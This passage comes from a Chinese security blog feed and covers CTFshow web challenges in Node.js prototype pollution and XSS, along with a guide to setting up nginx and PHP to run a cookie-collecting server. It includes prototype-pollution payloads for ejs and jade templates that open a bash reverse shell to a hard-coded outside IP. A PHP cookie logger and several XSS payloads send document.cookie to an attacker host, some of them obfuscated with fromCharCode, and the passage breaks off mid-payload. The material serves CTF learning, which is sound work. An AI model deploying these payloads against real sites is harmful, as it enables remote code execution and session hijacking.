operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> payload <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"__proto__":&#123;"__proto__":&#123;"query":true&#125;&#125;&#125;'</span><span class="token punctuation">)</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">,</span>payload<span class="token punctuation">)</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'payload:'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">// &#123; ['__proto__']: &#123; ['__proto__']: &#123; query: true &#125; &#125; &#125;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Object:'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>query<span class="token punctuation">)</span> <span class="token comment">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>query<span class="token punctuation">)</span> <span class="token comment">// true</span></code></pre><p>当我们嵌套两层<code>__proto__</code>时，不管是user对象还是user.userinfo对象都存在query属性，并成功被赋值。</p><p>Payload：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"query"</span><span class="token operator">:</span><span class="token string">"return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >&amp; /dev/tcp/117.72.70.186/6789 0>&amp;1\"')"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web341-ejs模板渲染"><a href="#web341-ejs模板渲染" class="headerlink" title="web341(ejs模板渲染)"></a>web341(ejs模板渲染)</h4><p>这次依旧是两层user，但是没api.js了</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"outputFunctionName"</span><span class="token operator">:</span><span class="token string">"_llama1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >&amp; /dev/tcp/117.72.70.186/6789 0>&amp;1\"');var _llama2"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">Express+lodash+ejs: 从原型链污染到RCE</a></p><p><a href="https://xz.aliyun.com/t/6113?time__1311=n4+xnD0DgDcDRlWDkDlhAe0=t+3q0odwrmxTD">XNUCA2019 Hardjs题解 从原型链污染到RCE</a></p><p>这次flag在根目录</p><h4 id="web342-343-jabe模板渲染"><a href="#web342-343-jabe模板渲染" class="headerlink" title="web342-343(jabe模板渲染)"></a>web342-343(jabe模板渲染)</h4><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"Block"</span><span class="token punctuation">,</span><span class="token property">"nodes"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"compileDebug"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"self"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"line"</span><span class="token operator">:</span><span class="token string">"global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >&amp; /dev/tcp/117.72.70.186/6789 0>&amp;1\"')"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><a href="https://xz.aliyun.com/t/7025?time__1311=n4+xnD0Dy7itGQ=47KDsA3rZY=aL274AKfQx">再探 JavaScript 原型链污染到 RCE</a></p><p><a href="https://www.anquanke.com/post/id/236354">关于nodejs的ejs和jade模板引擎的原型链污染挖掘</a></p><h4 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h4><p>Hint:</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag <span class="token operator">=</span> <span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">8c|2c|\,</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">var</span> query <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>query<span class="token punctuation">.</span>name<span class="token operator">===</span><span class="token string">'admin'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>password<span class="token operator">===</span><span class="token string">'ctfshow'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>isVIP<span class="token operator">===</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag. :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>过滤了逗号和逗号的url编码2C，我们用“&amp;”连接三个属性，NodeJS会自动拼接</p><pre class="language-json" data-language="json"><code class="language-json">?query=<span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"admin"</span>&amp;query=<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"ctfshow"</span>&amp;query=<span class="token property">"isVIP"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span></code></pre><p>不过还需要对属性进行url编码，payload：</p><pre class="language-json" data-language="json"><code class="language-json">?query=%7b%<span class="token number">22</span>%6e%<span class="token number">61</span>%6d%<span class="token number">65</span>%<span class="token number">22</span>%3a%<span class="token number">22</span>%<span class="token number">61</span>%<span class="token number">64</span>%6d%<span class="token number">69</span>%6e%<span class="token number">22</span>&amp;query=%<span class="token number">22</span>%<span class="token number">70</span>%<span class="token number">61</span>%<span class="token number">73</span>%<span class="token number">73</span>%<span class="token number">77</span>%6f%<span class="token number">72</span>%<span class="token number">64</span>%<span class="token number">22</span>%3a%<span class="token number">22</span>%<span class="token number">63</span>%<span class="token number">74</span>%<span class="token number">66</span>%<span class="token number">73</span>%<span class="token number">68</span>%6f%<span class="token number">77</span>%<span class="token number">22</span>&amp;query=%<span class="token number">22</span>%<span class="token number">69</span>%<span class="token number">73</span>%<span class="token number">56</span>%<span class="token number">49</span>%<span class="token number">50</span>%<span class="token number">22</span>%3a%<span class="token number">74</span>%<span class="token number">72</span>%<span class="token number">75</span>%<span class="token number">65</span>%7d</code></pre><p>因为在get之前双引号会被url编码为%22，与“ctfshow”组成“2c”，符合正则。</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu18.04上nginx+php环境搭建</title>
      <link href="/2024/07/24/Ubuntu18.04%E4%B8%8Anginx+php%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2024/07/24/Ubuntu18.04%E4%B8%8Anginx+php%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>在学习XSS漏洞过程中，由于目前大多数XSS平台都变成了收费的，所以打算自己用服务器搭建来完成XSS题目</p><p>中途遇到不少问题，这里分享一下经验</p><p>实验环境</p><p>操作系统：Ubuntu 18.04 64位</p><p>nginx：1.14.0</p><p>php：7.2.17-0</p><p>php-fram：php7.2-fpm</p><h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><h5 id="安装必要程序和依赖"><a href="#安装必要程序和依赖" class="headerlink" title="安装必要程序和依赖"></a>安装必要程序和依赖</h5><p>#安装程序包</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2-fpm   <span class="token comment">#nginx与php之间的桥梁</span><span class="token function">sudo</span> <span class="token function">apt</span> remove apache2* <span class="token comment">#删除自动安装的Apache2，注意最后面有星号</span><span class="token function">sudo</span> <span class="token function">apt</span> autoremove <span class="token comment"># 清除Apache2的依赖</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> nginx</code></pre><p>#安装必要依赖</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php-json<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php-curl<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2-mysql<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2-cgi</code></pre><h5 id="浏览器http-xxxxxx-自己的IP-，出现如下界面即为成功"><a href="#浏览器http-xxxxxx-自己的IP-，出现如下界面即为成功" class="headerlink" title="浏览器http://xxxxxx(自己的IP)，出现如下界面即为成功"></a>浏览器<a href="http://xxxxxx(自己的ip),出现如下界面即为成功/">http://xxxxxx(自己的IP)，出现如下界面即为成功</a></h5><p><img src="welcome.png" loading="lazy"></p><p>有可能显示为阿帕奇主页，可以尝试删除 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.html</p><p>因为安装php的时候会自动安装apache2,导致往这里写了这个index.html静态文件，卸载了Apache2，但这个index没删掉，导致出现异常，问题不大</p><h5 id="配置php-frm"><a href="#配置php-frm" class="headerlink" title="配置php-frm"></a>配置php-frm</h5><h6 id="修改frm配置文件"><a href="#修改frm配置文件" class="headerlink" title="修改frm配置文件"></a>修改frm配置文件</h6><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/php/7.2/fpm/php.ini</code></pre><p>vim不是唯一选择，也可以更换自己熟悉的编辑器</p><p>#修改如下参数</p><p><code>;cgi.fix_fathinfo=1</code>改为<code>cgi.fix_fathinfo=0</code></p><p><img src="phpini.png" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/php/7.2/fpm/pool.d/www.conf</code></pre><p>#修改如下参数</p><p>listen &#x3D; 127.0.0.1:9000 （原先值是&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock）<br>listen.allowed_clients &#x3D; 127.0.0.1<br>pm.max_children &#x3D; 50<br>pm.max_requests &#x3D; 500<br>request_terminate_timeout &#x3D; 0<br>rlimit_files &#x3D; 1024</p><h6 id="编写demo测试一下"><a href="#编写demo测试一下" class="headerlink" title="编写demo测试一下"></a>编写demo测试一下</h6><p>在<code>/var/www/html/</code>下编写index.php</p><pre class="language-markup" data-language="markup"><code class="language-markup">vim /var/www/html/index.php内容如下：    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span> Hello,this is test page. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></code></pre><h6 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h6><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/nginx/sites-available/default</code></pre><p>在<code>index.html</code>前加上<code>index.php</code></p><p>将以下框中内容修改</p><pre class="language-http" data-language="http"><code class="language-http">location ~ \.php$ &#123;    root           html;    fastcgi_pass   127.0.0.1:9000;    fastcgi_index  index.php;    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;    include        fastcgi_params;&#125;</code></pre><p><img src="nginx.png" alt="img" loading="lazy"></p><h6 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h6><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">service</span> php7.2-fpm restart<span class="token function">sudo</span> <span class="token function">service</span> nginx restart </code></pre><h4 id="查看demo测试"><a href="#查看demo测试" class="headerlink" title="查看demo测试"></a>查看demo测试</h4><p>浏览器访问自己的IP</p><p><img src="Demo.png" loading="lazy"></p><p>至此就可以进行编写自己的网站了，因为我是用作XSS平台用，所以简单分享一下我的问题</p><h4 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h4><h5 id="网页无法访问"><a href="#网页无法访问" class="headerlink" title="网页无法访问"></a>网页无法访问</h5><p>我在<code>/var/www/html/</code>下创建了<code>xss</code>的目录，下面放了可以反弹到cookie的php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d h:i:s'</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cookie.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">,</span><span class="token variable">$time</span><span class="token operator">.</span><span class="token string single-quoted-string">':    '</span><span class="token operator">.</span> <span class="token variable">$cookie</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>刚开始一直访问不了 报错：<code>Not input file specified</code>然后看日志<code>/var/log/nginx/error.log</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">FastCGI sent <span class="token keyword">in</span> stderr: <span class="token string">"Unable to open primary script: /var/www/html//xss/cookie.php (No such file or directory)"</span></code></pre><p>看到文件路径多了一个<code>/</code>于是查询，在配置nginx的时候出了点小问题<code>fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;</code>改成这样删去多余的<code>/</code></p><h5 id="无法写入文件"><a href="#无法写入文件" class="headerlink" title="无法写入文件"></a>无法写入文件</h5><p>因为这个php是要把反弹过来的cookie写入txt的，所以我这个虽然可以成功打开，但是一直写入不了，于是更改目录<code>xss</code>的权限为664，改完之后是有写入权限了，但是网页又打不开了，然后发现，作为目录不仅需要写入权限也需要可执行权限，于是改成777，已经全部解决。</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> nginx+php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-xss</title>
      <link href="/2024/07/24/web%E5%85%A5%E9%97%A8-xss/"/>
      <url>/2024/07/24/web%E5%85%A5%E9%97%A8-xss/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><h4 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h4><p>跨站脚本攻击（XSS），是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。</p><p>HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是HTML标签的开始，之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。</p><p>俗称的见框就插。个人理解，由于HTML的标签特性，可以通过网页的输入框输入脚本代码，使网页执行恶意脚本，达到攻击的目的。</p><h4 id="XSS类型介绍"><a href="#XSS类型介绍" class="headerlink" title="XSS类型介绍"></a>XSS类型介绍</h4><h5 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a><strong>反射型</strong></h5><p>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中</p><p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p><h5 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h5><p>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</p><p>此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p><h5 id="DOM-型"><a href="#DOM-型" class="headerlink" title="DOM 型"></a>DOM 型</h5><p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</p><p>常见的标签</p><p>1.alert()</p><ul><li>alert(‘xss’)</li><li>alert(“xss”)</li><li>alert(&#x2F;xss&#x2F;)</li><li>alert(document.cookie)</li></ul><p>2.confirm()</p><ul><li>confirm(‘xss’)</li><li>confirm(“xss”)</li><li>confirm(&#x2F;xss&#x2F;)</li><li>confirm(document.cookie)</li></ul><p>3.prompt()</p><ul><li>prompt(‘xss’)</li><li>prompt(“xss”)</li><li>prompt(&#x2F;xss&#x2F;)</li><li>prompt(document.coolkie)</li><li>(&#x2F;xss&#x2F;) 以上三种方法都可以实现，但是会多出两个‘&#x2F;’</li></ul><p>4.document.write()</p><ul><li>document.write(‘</li></ul><h3 id="web316-333"><a href="#web316-333" class="headerlink" title="web316-333"></a>web316-333</h3><h4 id="web316-cookie-script"><a href="#web316-cookie-script" class="headerlink" title="web316(cookie script)"></a>web316(cookie script)</h4><p>可以使用xss平台，也可以使用服务器自己搭建</p><p>在服务器上面放一个接受Cookie的文件。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d h:i:s'</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cookie.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">,</span><span class="token variable">$time</span><span class="token operator">.</span><span class="token string single-quoted-string">':    '</span><span class="token operator">.</span> <span class="token variable">$cookie</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://xxxxxx/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>cookie.txt里面就可以看到flag，或者查看日志</p><h4 id="web317-img"><a href="#web317-img" class="headerlink" title="web317(img)"></a>web317(img)</h4><p>过滤了<code>script</code>可以使用<code>img</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">""</span> onerror<span class="token operator">=</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://xxxxxx/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie <span class="token operator">></span></code></pre><h4 id="web318-body-iframe"><a href="#web318-body-iframe" class="headerlink" title="web318(body iframe)"></a>web318(body iframe)</h4><p>过滤了<code>img</code>使用<code>body</code>或者<code>iframe</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body onload<span class="token operator">=</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://xxxxxxx/xss/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">></span><span class="token operator">&lt;</span>iframe οnlοad<span class="token operator">=</span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://xxxxxxx/xss/cookie.php?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">></span></code></pre><h4 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h4><p>同318</p><h4 id="web320-326-空格绕过-fromCharCode"><a href="#web320-326-空格绕过-fromCharCode" class="headerlink" title="web320-326(空格绕过  fromCharCode)"></a>web320-326(空格绕过  fromCharCode)</h4><p>过滤了<code>script</code>，<code>img</code>，<code>  </code>, <code>iframe</code>。</p><p>web322过滤了xss</p><p>空格可以用<code>%09</code>、<code>tab</code>、<code>/</code>、<code>/**/</code>、<code>%0a</code>代替。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body<span class="token comment">/**/</span>onload<span class="token operator">=</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://xxxxxxx/xss/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">></span><span class="token operator">&lt;</span>iframe<span class="token comment">/**/</span>οnlοad<span class="token operator">=</span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://xxxxxxx/xss/cookie.php?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">></span></code></pre><p>扩展一下payload：</p><p>String.fromCharCode()函数：ascii码转字符</p><p>参考：<a href="https://www.runoob.com/jsref/jsref-fromcharcode.html">https://www.runoob.com/jsref/jsref-fromcharcode.html</a></p><p>String.fromCharCode(111,110,108,111,97,100); 控制台运行结果如下：</p><p><img src="web%E5%85%A5%E9%97%A8-xss%5Cweb320.png" loading="lazy"></p><p>用它我可以构造一个payload：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body<span class="token comment">/**/</span>οnlοad<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">54</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token 